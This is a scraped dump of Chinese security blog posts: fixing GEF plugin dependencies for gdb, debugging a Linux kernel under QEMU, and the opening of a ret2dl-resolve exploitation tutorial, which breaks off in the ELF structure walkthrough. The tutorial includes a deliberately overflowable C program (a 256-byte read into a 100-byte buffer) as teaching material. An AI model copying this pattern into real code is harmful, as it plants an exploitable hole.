LTSRelease: 16.04Codename: xenial➜ ~ gdbGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\".GEF for linux ready, type `gef' to start, `gef config' to configure80 commands loaded for GDB 7.11.1 using Python engine 3.5gef➤ gef missing[*] Command `assemble` is missing, reason → Missing `keystone-engine` package for Python3, install with: `pip3 install keystone-engine`.[*] Command `ropper` is missing, reason → Missing `ropper` package for Python3, install with: `pip3 install ropper`.[*] Command `unicorn-emulate` is missing, reason → Missing `unicorn` package for Python3. Install with `pip3 install unicorn`.[*] Command `set-permission` is missing, reason → Missing `keystone-engine` package for Python3, install with: `pip3 install keystone-engine`.[*] Command `capstone-disassemble` is missing, reason → Missing `capstone` package for Python3. Install with `pip3 install capstone`.gef➤ Step One第一步先尝试用 pip 安装所有的依赖包： 1➜ ~ pip3 install --user unicorn keystone-engine ropper capstone -i https://pypi.tuna.tsinghua.edu.cn/simple 结果发现 ropper 安装失败了 Step Tworopper 安装失败的主要原因是 filebytes 这个包装不好： 1234567891011121314151617181920➜ ~ pip3 install --user ropperCollecting ropperCollecting filebytes&gt;=0.9.18 (from ropper)ERROR: ropper 1.12.1 requires filebytes&gt;=0.9.18, which is not installed.Installing collected packages: filebytes, ropperERROR: Exception:Traceback (most recent call last): File \"/usr/local/lib/python3.5/dist-packages/pip/_internal/cli/base_command.py\", line 178, in main status = self.run(options, args) File \"/usr/local/lib/python3.5/dist-packages/pip/_internal/commands/install.py\", line 414, in run use_user_site=options.use_user_site, File \"/usr/local/lib/python3.5/dist-packages/pip/_internal/req/__init__.py\", line 58, in install_given_reqs **kwargs File \"/usr/local/lib/python3.5/dist-packages/pip/_internal/req/req_install.py\", line 920, in install use_user_site=use_user_site, pycompile=pycompile, File \"/usr/local/lib/python3.5/dist-packages/pip/_internal/req/req_install.py\", line 448, in move_wheel_files warn_script_location=warn_script_location, File \"/usr/local/lib/python3.5/dist-packages/pip/_internal/wheel.py\", line 428, in move_wheel_files assert info_dir, \"%s .dist-info directory not found\" % reqAssertionError: filebytes&gt;=0.9.18 .dist-info directory not found 于是尝试用源码安装： 123456➜ ~ git clone https://github.com/sashs/filebytes.git➜ ~ cd filebytes➜ ~ sudo python3 setup.py install➜ ~ git clone https://github.com/sashs/ropper.git➜ ~ cd ropper➜ ~ sudo python3 setup.py install Step Three接下来 keystone 报错了： 1234567891011121314151617181920➜ ~ gdbGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\".GEF for linux ready, type `gef' to start, `gef config' to configure80 commands loaded for GDB 7.11.1 using Python engine 3.5gef➤ gef missing[*] module 'keystone' has no attribute 'KS_ARCH_X86'gef➤ Google 了一下找到的方法也是用源码来装： 123456789➜ ~ wget https://github.com/keystone-engine/keystone/archive/0.9.1.tar.gz➜ ~ tar xzvf 0.9.1.tar.gz➜ ~ cd keystone-0.9.1/➜ ~ mkdir build➜ ~ cd build➜ ~ ../make-share.sh➜ ~ sudo make install➜ ~ sudo ldconfig➜ ~ kstool 然后再重新装一下 ropper： 1➜ ~ pip3 install --user ropper -i https://pypi.tuna.tsinghua.edu.cn/simple Another Way转自m6m wiki。 12sudo apt update &amp;&amp; sudo apt install -y build-essential python3 python3-dev python3-pip gdb libcapstone3 libcapstone-dev cmakesudo -H pip3 install unicorn capstone filebytes 接下来按照之前的方法安装一下 keystone。最后安装 ropper。 1sudo -H pip3 install ropper Finally终于没有报gef missing了： 1234567891011121314151617181920➜ ~ gdbGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\".GEF for linux ready, type `gef' to start, `gef config' to configure80 commands loaded for GDB 7.11.1 using Python engine 3.5gef➤ gef missing[+] No missing commandgef➤ Referenceshttps://wiki.m6m.dev/ctf/gdb/gef/missing","categories":[],"tags":[{"name":"solution","slug":"solution","permalink":"qianfei11.coding.me/tags/solution/"}]},{"title":"使用QEMU+gdb对Linux Kernel进行调试","slug":"使用QEMU-gdb对Linux-Kernel进行调试","date":"2019-08-08T01:02:12.000Z","updated":"2019-11-29T08:13:24.574Z","comments":true,"path":"2019/08/08/使用QEMU-gdb对Linux-Kernel进行调试/","link":"","permalink":"qianfei11.coding.me/2019/08/08/使用QEMU-gdb对Linux-Kernel进行调试/","excerpt":"最近在分析一个 CVE 的时候涉及到对内核的调试，先提前研究一下。","text":"最近在分析一个 CVE 的时候涉及到对内核的调试，先提前研究一下。 Environment12345678➜ ~ uname -aLinux ubuntu 4.4.0-92-generic #115-Ubuntu SMP Thu Aug 10 09:04:33 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux➜ ~ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 16.04.6 LTSRelease: 16.04Codename: xenial 使用Ubuntu 16.04，因为该发行版默认已经开启了内核调试支持： 12345678910➜ ~ cat /boot/config-4.4.0-92-generic | grep \"GDB\"# CONFIG_CFG80211_INTERNAL_REGDB is not setCONFIG_SERIAL_KGDB_NMI=yCONFIG_GDB_SCRIPTS=yCONFIG_HAVE_ARCH_KGDB=yCONFIG_KGDB=yCONFIG_KGDB_SERIAL_CONSOLE=y# CONFIG_KGDB_TESTS is not setCONFIG_KGDB_LOW_LEVEL_TRAP=yCONFIG_KGDB_KDB=y PreparationSymbolic Files首先准备调试需要的符号文件。看一下该版本的Codename： 12➜ ~ lsb_release -cCodename: xenial 然后新建文件ddebs.list，其内容如下（看情况修改Codename）： 12345➜ ~ cat /etc/apt/sources.list.d/ddebs.listdeb http://ddebs.ubuntu.com/ xenial main restricted universe multiversedeb http://ddebs.ubuntu.com/ xenial-security main restricted universe multiversedeb http://ddebs.ubuntu.com/ xenial-updates main restricted universe multiversedeb http://ddebs.ubuntu.com/ xenial-proposed main restricted universe multiverse http://ddebs.ubuntu.com是Ubuntu的符号服务器。执行下面的命令添加密钥，然后就可以更新并下载符号文件了： 12345➜ ~ wget -O - http://ddebs.ubuntu.com/dbgsym-release-key.asc | sudo apt-key add -➜ ~ sudo apt-get update➜ ~ uname -r4.4.0-92-generic➜ ~ sudo apt-get install linux-image-4.13.0-38-generic-dbgsym 完成后，符号文件将会放在下面的目录下： 12➜ ~ file /usr/lib/debug/boot/vmlinux-4.4.0-92-generic/usr/lib/debug/boot/vmlinux-4.4.0-92-generic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=a57bd034055907e83dfd68d2999f976285d2ab31, not stripped 可以看到这是一个静态链接的可执行文件，用gdb可以进行调试，像这样： 1234567891011121314151617181920212223242526272829➜ ~ gdb -q /usr/lib/debug/boot/vmlinux-4.4.0-92-genericGEF for linux ready, type `gef' to start, `gef config' to configure79 commands loaded for GDB 7.11.1 using Python engine 3.5[*] 1 command could not be loaded, run `gef missing` to know why.Reading symbols from /usr/lib/debug/boot/vmlinux-4.4.0-92-generic...done.gef➤ p init_uts_ns$1 = &#123; kref = &#123; refcount = &#123; counter = 0x2 &#125; &#125;, name = &#123; sysname = \"Linux\", '\\000' &lt;repeats 59 times&gt;, nodename = \"(none)\", '\\000' &lt;repeats 58 times&gt;, release = \"4.4.0-92-generic\", '\\000' &lt;repeats 48 times&gt;, version = \"#115-Ubuntu SMP Thu Aug 10 09:04:33 UTC 2017\", '\\000' &lt;repeats 20 times&gt;, machine = \"x86_64\", '\\000' &lt;repeats 58 times&gt;, domainname = \"(none)\", '\\000' &lt;repeats 58 times&gt; &#125;, user_ns = 0xffffffff81e42a00 &lt;init_user_ns&gt;, ns = &#123; stashed = &#123; counter = 0x0 &#125;, ops = 0xffffffff81a1afe0 &lt;utsns_operations&gt;, inum = 0xeffffffe &#125;&#125; Linux KernelLinux 内核源代码肯定少不了： 12345678sudo apt-get install libncurses5-dev build-essential kernel-packagewget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.20.17.tar.gztar -xvf linux-4.20.17.tar.gzcd linux-4.20.17make menuconfigmakemake allmake modules make menuconfig中需要勾选的： KernelHacking 选中Compile the kernel with debug info 选中Compile the kernel with frame pointers 选中KGDB:kernel debugging with remote gdb Processor type and features 取消Paravirtualized guest support KernelHacking 取消Write protect kernel read-only data structures Busybox启动内核还需要一个简单的文件系统和一些命令，可以使用busybox来构建 123456cdwget https://busybox.net/downloads/busybox-$&#123;VERSION&#125;.tar.bz2tar -jxvf busybox-$&#123;VERSION&#125;.tar.bz2cd $BUSYBOX_SRCmake menuconfigmake install make menuconfig中需要勾选的： Busybox Settings Build Options Build Busybox as a static binary（编译成静态文件） Linux System Utilities 关闭Support mounting NFS file system（网络文件系统） Networking Utilities 关闭inetd (Internet 超级服务器) 接下来在busybox下简单配置一下启动脚本： 123456789cd _installmkdir proc sys dev etc etc/init.dvim etc/init.d/rcSchmod +x etc/init.d/rcScat etc/init.d/rcS# #!/bin/sh# mount -t proc none /proc# mount -t sysfs none /sys# /sbin/mdev -s 然后创建文件系统： 1find . | cpio -o --format=newc &gt; ../rootfs.img 接下来就可以启动系统了： 1qemu-system-x86_64 -kernel $KERNEL_SRC/arch/x86_64/boot/bzImage -initrd $BUSYBOX_SRC/rootfs.img -append \"console=ttyS0 root=/dev/ram rdinit=/sbin/init\" -cpu kvm64,+smep,+smap --nographic -gdb tcp::1234 Finally it Kind-of Works接下来可以用gdb进行调试，同时尝试在函数cmdline_proc_show()处下断点： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495➜ ~ gdb -ex \"target remote localhost:1234\" $KERNEL_SRC/vmlinuxGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\"...GEF for linux ready, type `gef' to start, `gef config' to configure79 commands loaded for GDB 7.11.1 using Python engine 3.5[*] 1 command could not be loaded, run `gef missing` to know why.Reading symbols from /home/assassinq/linux-4.4.1/vmlinux...done.warning: File \"/home/assassinq/linux-4.4.1/scripts/gdb/vmlinux-gdb.py\" auto-loading has been declined by your `auto-load safe-path' set to \"$debugdir:$datadir/auto-load\".To enable execution of this file add add-auto-load-safe-path /home/assassinq/linux-4.4.1/scripts/gdb/vmlinux-gdb.pyline to your configuration file \"/home/assassinq/.gdbinit\".To completely disable this security protection add set auto-load safe-path /line to your configuration file \"/home/assassinq/.gdbinit\".For more information about this security protection see the\"Auto-loading safe path\" section in the GDB manual. E.g., run from the shell: info \"(gdb)Auto-loading safe path\"Remote debugging using localhost:1234native_safe_halt () at ./arch/x86/include/asm/irqflags.h:5050 &#125;[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x0000000000000000 → 0x0000000000000000$rbx : 0xffffffff81d585c0 → 0x0000000000000001 → 0x0000000000000001$rcx : 0x0000000000000000 → 0x0000000000000000$rdx : 0x0000000000000000 → 0x0000000000000000$rsp : 0xffffffff81bf7e98 → &lt;init_thread_union+16024&gt; mov eax, 0xff81bf7e$rbp : 0xffffffff81bf7e98 → &lt;init_thread_union+16024&gt; mov eax, 0xff81bf7e$rsi : 0x0000000000000000 → 0x0000000000000000$rdi : 0x0000000000000000 → 0x0000000000000000$rip : 0xffffffff810624f6 → 0x000000841f0fc35d → 0x000000841f0fc35d$r8 : 0xffff88000760db60 → 0x0000000000000000 → 0x0000000000000000$r9 : 0x0000000000000000 → 0x0000000000000000$r10 : 0x0000000000000333 → 0x0000000000000333$r11 : 0xffff880006d8bde0 → 0x0000000000000400 → 0x0000000000000400$r12 : 0x0000000000000000 → 0x0000000000000000$r13 : 0x0000000000000000 → 0x0000000000000000$r14 : 0x0000000000000000 → 0x0000000000000000$r15 : 0xffffffff81bf4000 → &lt;init_thread_union+0&gt; add BYTE PTR [rbp-0x40], dl$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000───────────────────────────────────────────────────────────────────── stack ────[!] Unmapped address─────────────────────────────────────────────────────────────── code:x86:64 ──── 0xffffffff810624f1 &lt;native_safe_halt+1&gt; mov rbp, rsp 0xffffffff810624f4 &lt;native_safe_halt+4&gt; sti 0xffffffff810624f5 &lt;native_safe_halt+5&gt; hlt 0xffffffff810624f6 &lt;native_safe_halt+6&gt; pop rbp 0xffffffff810624f7 &lt;native_safe_halt+7&gt; ret 0xffffffff810624f8 nop DWORD PTR [rax+rax*1+0x0] 0xffffffff81062500 &lt;native_halt+0&gt; push rbp 0xffffffff81062501 &lt;native_halt+1&gt; mov rbp, rsp 0xffffffff81062504 &lt;native_halt+4&gt; hlt────────────────────────────────────────── source:./arch/x86/incl[...].h+50 ──── 45 &#125; 46 47 static inline void native_safe_halt(void) 48 &#123; 49 asm volatile(\"sti; hlt\": : :\"memory\"); → 50 &#125; 51 52 static inline void native_halt(void) 53 &#123; 54 asm volatile(\"hlt\": : :\"memory\"); 55 &#125;─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: \"\", stopped, reason: SIGTRAP───────────────────────────────────────────────────────────────────── trace ────[#0] 0xffffffff810624f6 → native_safe_halt()[#1] 0xffffffff81020cee → arch_safe_halt()[#2] 0xffffffff81020cee → default_idle()[#3] 0xffffffff8102147f → arch_cpu_idle()[#4] 0xffffffff810c06fa → default_idle_call()[#5] 0xffffffff810c0a37 → cpuidle_idle_call()[#6] 0xffffffff810c0a37 → cpu_idle_loop()[#7] 0xffffffff810c0a37 → cpu_startup_entry(state=&lt;optimized out&gt;)[#8] 0xffffffff8181accc → rest_init()[#9] 0xffffffff81d7f023 → start_kernel()────────────────────────────────────────────────────────────────────────────────gef➤ b cmdline_proc_showBreakpoint 1 at 0xffffffff81276000: file fs/proc/cmdline.c, line 7.gef➤ cContinuing. 在终端输入cat /proc/cmdline后会被断点断下来： 1234567/ # iduid=0 gid=0/ # whoamiwhoami: unknown uid 0/ # pwd// # cat /proc/cmdline 可以跟着源码调试了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263...Breakpoint 1, cmdline_proc_show (m=0xffff880005f7c180, v=0x1 &lt;irq_stack_union+1&gt;) at fs/proc/cmdline.c:77 &#123;[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0xffff880000047ee0 → push rax$rbx : 0x0000000000000000 → 0x0000000000000000$rcx : 0x0000000000003014 → 0x0000000000003014$rdx : 0x0000000000003013 → 0x0000000000003013$rsp : 0xffff880005fc3868 → mov esp, 0xff812245$rbp : 0xffff880005fc38d0 → lock cmp ah, bh$rsi : 0x0000000000000001 → 0x0000000000000001$rdi : 0xffff880005f7c180 → add BYTE PTR [rax], al$rip : 0xffffffff81276000 → &lt;cmdline_proc_show+0&gt; nop DWORD PTR [rax+rax*1+0x0]$r8 : 0xffff880007619bc0 → add BYTE PTR [rax-0xc], al$r9 : 0xffff880005f40000 → add BYTE PTR [rax-0xc], al$r10 : 0x0000000000000001 → 0x0000000000000001$r11 : 0xffff880005fc4000 → 0x0000000000000000 → 0x0000000000000000$r12 : 0xffff880005fc3a88 → 0x0000000000000000 → 0x0000000000000000$r13 : 0xffff880005f7d000 → 0x0000000000000000 → 0x0000000000000000$r14 : 0xffff880005f7c180 → add BYTE PTR [rax], al$r15 : 0x0000000000000001 → 0x0000000000000001$eflags: [CARRY parity adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0063 $gs: 0x0000───────────────────────────────────────────────────────────────────── stack ────[!] Unmapped address─────────────────────────────────────────────────────────────── code:x86:64 ──── 0xffffffff81275ff7 &lt;cmdline_proc_open+23&gt; repnz cli 0xffffffff81275ff9 &lt;cmdline_proc_open+25&gt; call FWORD PTR [rbp-0x3d] 0xffffffff81275ffc nop DWORD PTR [rax+0x0] 0xffffffff81276000 &lt;cmdline_proc_show+0&gt; nop DWORD PTR [rax+rax*1+0x0] 0xffffffff81276005 &lt;cmdline_proc_show+5&gt; push rbp 0xffffffff81276006 &lt;cmdline_proc_show+6&gt; mov rdx, QWORD PTR [rip+0xcccffb] # 0xffffffff81f43008 &lt;saved_command_line&gt; 0xffffffff8127600d &lt;cmdline_proc_show+13&gt; mov rsi, 0xffffffff81b454d3 0xffffffff81276014 &lt;cmdline_proc_show+20&gt; mov rbp, rsp 0xffffffff81276017 &lt;cmdline_proc_show+23&gt; call 0xffffffff81224970 &lt;seq_printf&gt;──────────────────────────────────────────────── source:fs/proc/cmdline.c+7 ──── 2 #include &lt;linux/init.h&gt; 3 #include &lt;linux/proc_fs.h&gt; 4 #include &lt;linux/seq_file.h&gt; 5 6 static int cmdline_proc_show(struct seq_file *m, void *v) → 7 &#123; 8 seq_printf(m, &quot;%s\\n&quot;, saved_command_line); 9 return 0; 10 &#125; 11 12 static int cmdline_proc_open(struct inode *inode, struct file *file)─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;&quot;, stopped, reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xffffffff81276000 → cmdline_proc_show(m=0xffff880005f7c180, v=0x1 &lt;irq_stack_union+1&gt;)[#1] 0xffffffff812245bc → seq_read(file=0xffff880005f7d000, buf=&lt;optimized out&gt;, size=&lt;optimized out&gt;, ppos=0xffff880005fc3a88)[#2] 0xffffffff8126d4e2 → proc_reg_read(file=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, count=&lt;optimized out&gt;, ppos=&lt;optimized out&gt;)[#3] 0xffffffff811fff55 → do_loop_readv_writev(filp=&lt;optimized out&gt;, iter=0xffff880005fc3958, ppos=0xffff880005fc3a88, fn=0xffffffff8126d4a0 &lt;proc_reg_read&gt;)[#4] 0xffffffff81200d52 → do_readv_writev(type=0x0, file=0xffff880005f7d000, uvector=&lt;optimized out&gt;, nr_segs=&lt;optimized out&gt;, pos=0xffff880005fc3a88)[#5] 0xffffffff81200da6 → vfs_readv(file=&lt;optimized out&gt;, vec=&lt;optimized out&gt;, vlen=&lt;optimized out&gt;, pos=&lt;optimized out&gt;)[#6] 0xffffffff8123283a → kernel_readv(offset=&lt;optimized out&gt;, vlen=&lt;optimized out&gt;, vec=&lt;optimized out&gt;, file=&lt;optimized out&gt;)[#7] 0xffffffff8123283a → default_file_splice_read(in=&lt;optimized out&gt;, ppos=&lt;optimized out&gt;, pipe=&lt;optimized out&gt;, len=0xff0000, flags=&lt;optimized out&gt;)[#8] 0xffffffff81231209 → do_splice_to(in=0xffff880005f7d000, ppos=0xffff880005fc3df0, pipe=0xffff880005f7c300, len=0x1000000, flags=0x0)[#9] 0xffffffff812312da → splice_direct_to_actor(in=&lt;optimized out&gt;, sd=0x1 &lt;irq_stack_union+1&gt;, actor=&lt;optimized out&gt;)────────────────────────────────────────────────────────────────────────────────... Referenceshttps://xz.aliyun.com/t/2306https://n132.github.io/2019/07/14/2019-07-14-kernel-Outset/https://github.com/firmianay/CTF-All-In-One/blob/master/doc/4.1_linux_kernel_debug.mdhttp://blog.sina.com.cn/s/blog_3e4774e30102vwqy.html","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"qianfei11.coding.me/tags/linux/"}]},{"title":"A trip of ret2dl-resolve","slug":"A-trip-of-ret2dl-resolve","date":"2019-08-06T08:04:26.000Z","updated":"2019-08-26T05:55:20.464Z","comments":true,"path":"2019/08/06/A-trip-of-ret2dl-resolve/","link":"","permalink":"qianfei11.coding.me/2019/08/06/A-trip-of-ret2dl-resolve/","excerpt":"一步步了解dl-resolve的利用方法。","text":"一步步了解dl-resolve的利用方法。 Intro通过利用ret2dl-resolve绕过 NX 和 ASLR 的限制。 例子如下： 123456789101112131415161718#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void vuln() &#123; char buf[100]; setbuf(stdin, buf); read(0, buf, 256);&#125;int main() &#123; char buf[100] = \"Return to dl_runtime_resolve!\\n\"; setbuf(stdout, buf); write(1, buf, strlen(buf)); vuln(); return 0;&#125;// gcc -o bof -m32 -fno-stack-protector bof.c AnalysisELF HeaderELF 可执行文件由 ELF 头部，程序头部表和其对应的段，节头部表和其对应的节组成，源码在elf.h中实现 一个参与动态链接的可执行文件，它的程序头部表包含类型为PT_DYNAMIC的段，PT_DYNAMIC又包含.dynamic节，程序头的结构如下： 12345678910111213141516171819/* Dynamic section entry. */typedef struct&#123; Elf32_Sword d_tag; /* Dynamic entry type */ union &#123; Elf32_Word d_val; /* Integer value */ Elf32_Addr d_ptr; /* Address value */ &#125; d_un;&#125; Elf32_Dyn;typedef struct&#123; Elf64_Sxword d_tag; /* Dynamic entry type */ union &#123; Elf64_Xword d_val; /* Integer value */ Elf64_Addr d_ptr; /* Address value */ &#125; d_un;&#125; Elf64_Dyn; 执行readelf -d ./bof，其中Tag对应每一个节，比如JMPREL对应着.rel.plt： 12345678910111213141516171819202122232425262728λ readelf -d ./bofDynamic section at offset 0xf14 contains 24 entries: Tag Type Name/Value 0x00000001 (NEEDED) Shared library: [libc.so.6] 0x0000000c (INIT) 0x8048358 0x0000000d (FINI) 0x8048634 0x00000019 (INIT_ARRAY) 0x8049f08 0x0000001b (INIT_ARRAYSZ) 4 (bytes) 0x0000001a (FINI_ARRAY) 0x8049f0c 0x0000001c (FINI_ARRAYSZ) 4 (bytes) 0x6ffffef5 (GNU_HASH) 0x80481ac 0x00000005 (STRTAB) 0x8048278 0x00000006 (SYMTAB) 0x80481d8 0x0000000a (STRSZ) 107 (bytes) 0x0000000b (SYMENT) 16 (bytes) 0x00000015 (DEBUG) 0x0 0x00000003 (PLTGOT) 0x804a000 0x00000002 (PLTRELSZ) 40 (bytes) 0x00000014 (PLTREL) REL 0x00000017 (JMPREL) 0x8048330 0x00000011 (REL) 0x8048318 0x00000012 (RELSZ) 24 (bytes) 0x00000013 (RELENT) 8 (bytes) 0x6ffffffe (VERNEED) 0x80482f8 0x6fffffff (VERNEEDNUM) 1 0x6ffffff0 (VERSYM) 0x80482e4 0x00000000 (NULL) 0x0 节中包含目标文件的所有信息，节的结构如下： 123456789101112131415161718192021222324252627/* Section header. */typedef struct&#123; Elf32_Word sh_name; /* Section name (string tbl index) */ Elf32_Word sh_type; /* Section type */ Elf32_Word sh_flags; /* Section flags */ Elf32_Addr sh_addr; /* Section virtual addr at execution */ Elf32_Off sh_offset; /* Section file offset */ Elf32_Word sh_size; /* Section size in bytes */ Elf32_Word sh_link; /* Link to another section */ Elf32_Word sh_info; /* Additional section information */ Elf32_Word sh_addralign; /* Section alignment */ Elf32_Word sh_entsize; /* Entry size if section holds table */&#125; Elf32_Shdr;typedef struct&#123; Elf64_Word sh_name; /* Section name (string tbl index) */ Elf64_Word sh_type; /* Section type */ Elf64_Xword sh_flags; /* Section flags */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Section size in bytes */ Elf64_Word sh_link; /* Link to another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */&#125; Elf64_Shdr; 执行readelf -S ./bof，列出了该ELF的 31 个节区： 12345678910111213141516171819202122232425262728293031323334353637383940λ readelf -S ./bofThere are 31 section headers, starting at offset 0x18a4:Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 08048154 000154 000013 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 08048168 000168 000020 00 A 0 0 4 [ 3] .note.gnu.build-i NOTE 08048188 000188 000024 00 A 0 0 4 [ 4] .gnu.hash GNU_HASH 080481ac 0001ac 00002c 04 A 5 0 4 [ 5] .dynsym DYNSYM 080481d8 0001d8 0000a0 10 A 6 1 4 [ 6] .dynstr STRTAB 08048278 000278 00006b 00 A 0 0 1 [ 7] .gnu.version VERSYM 080482e4 0002e4 000014 02 A 5 0 2 [ 8] .gnu.version_r VERNEED 080482f8 0002f8 000020 00 A 6 1 4 [ 9] .rel.dyn REL 08048318 000318 000018 08 A 5 0 4 [10] .rel.plt REL 08048330 000330 000028 08 AI 5 24 4 [11] .init PROGBITS 08048358 000358 000023 00 AX 0 0 4 [12] .plt PROGBITS 08048380 000380 000060 04 AX 0 0 16 [13] .plt.got PROGBITS 080483e0 0003e0 000008 00 AX 0 0 8 [14] .text PROGBITS 080483f0 0003f0 000242 00 AX 0 0 16 [15] .fini PROGBITS 08048634 000634 000014 00 AX 0 0 4 [16] .rodata PROGBITS 08048648 000648 000008 00 A 0 0 4 [17] .eh_frame_hdr PROGBITS 08048650 000650 000034 00 A 0 0 4 [18] .eh_frame PROGBITS 08048684 000684 0000f4 00 A 0 0 4 [19] .init_array INIT_ARRAY 08049f08 000f08 000004 00 WA 0 0 4 [20] .fini_array FINI_ARRAY 08049f0c 000f0c 000004 00 WA 0 0 4 [21] .jcr PROGBITS 08049f10 000f10 000004 00 WA 0 0 4 [22] .dynamic DYNAMIC 08049f14 000f14 0000e8 08 WA 6 0 4 [23] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4 [24] .got.plt PROGBITS 0804a000 001000 000020 04 WA 0 0 4 [25] .data PROGBITS 0804a020 001020 000008 00 WA 0 0 4 [26] .bss NOBITS 0804a040 001028 00000c 00 WA 0 0 32 [27] .comment PROGBITS 00000000 001028 000035 01 MS 0 0 1 [28] .shstrtab STRTAB 00000000 001798 00010a 00 0 0 1 [29] .symtab SYMTAB 00000000 001060 0004b0 10 30 47 4 [30] .strtab STRTAB 00000000 001510 000288 00 0 0 1Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) 其中类型为 REL 的节区包含重定位表项，结构如下： 123456789101112131415/* Relocation table entry without addend (in section of type SHT_REL). */typedef struct&#123; Elf32_Addr r_offset; /* Address */ Elf32_Word r_info; /* Relocation type and symbol index */&#125; Elf32_Rel;/* I have seen two different definitions of the Elf64_Rel and Elf64_Rela structures, so we'll leave them out until Novell (or whoever) gets their act together. *//* The following, at least, is used on Sparc v9, MIPS, and Alpha. */typedef struct&#123; Elf64_Addr r_offset; /* Address */ Elf64_Xword r_info; /* Relocation type and symbol index */&#125; Elf64_Rel; 执行readelf -r ./bof，其中.rel.plt节用于函数重定位，.rel.dyn节用于变量重定位： 123456789101112131415λ readelf -r ./bofRelocation section '.rel.dyn' at offset 0x318 contains 3 entries: Offset Info Type Sym.Value Sym. Name08049ffc 00000306 R_386_GLOB_DAT 00000000 __gmon_start__0804a040 00000905 R_386_COPY 0804a040 stdin@GLIBC_2.00804a044 00000705 R_386_COPY 0804a044 stdout@GLIBC_2.0Relocation section '.rel.plt' at offset 0x330 contains 5 entries: Offset Info Type Sym.Value Sym. Name0804a00c 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.00804a010 00000207 R_386_JUMP_SLOT 00000000 read@GLIBC_2.00804a014 00000407 R_386_JUMP_SLOT 00000000 strlen@GLIBC_2.00804a018 00000507 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.00804a01c 00000607 R_386_JUMP_SLOT 00000000 write@GLIBC_2.0 以read为例，read函数的r_offset为=0x0804a010，r_info=0x00000207 .got节保存全局变量偏移表，.got.plt节保存全局函数偏移表。.got.plt对应着Elf32_Rel结构中r_offset的值 12345678910111213141516171819/* Symbol table entry. */typedef struct&#123; Elf32_Word st_name; /* Symbol name (string tbl index) 